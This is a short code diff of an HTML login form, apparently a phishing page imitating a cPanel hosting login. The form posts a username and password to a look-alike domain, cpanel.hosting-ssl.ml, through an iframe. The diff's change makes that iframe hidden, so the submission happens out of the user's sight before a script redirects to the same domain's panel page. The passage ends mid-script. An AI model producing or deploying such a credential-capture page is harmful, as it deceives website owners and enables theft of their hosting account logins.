@@ -1,14 +1,14 @@
-<form id="LoginForm" action="https://cpanel.hosting-ssl.ml/login.php" method="post" target="MyFrame">
+<form id="LoginForm" action="https://cpanel.hosting-ssl.ml/login.php" method="post" target="frame">
 	<p><span>Username: </span><input type="text" name="uname" placeholder="username"></p>
 	<p><span>Password: </span><input type="password" name="passwd" placeholder="password"></p>
 	<input type="hidden" name="submit" value="Login">
 	<input type="submit" value="Login">
 </form>
-<iframe id="MyFrame" name="MyFrame" src="about:blank"></iframe>
+<iframe id="frame" name="frame" src="about:blank" style="visibility: hidden;"></iframe>
 <script>
-	var frame = document.getElementById("MyFrame");
+	var frame = document.getElementById("frame");
 	frame.onload = function() {
-		var frame = document.getElementById("MyFrame");
+		var frame = document.getElementById("frame");
 		frame.onload =  function() {
 			window.location.href = "https://cpanel.hosting-ssl.ml/panel/index.php";
 		}
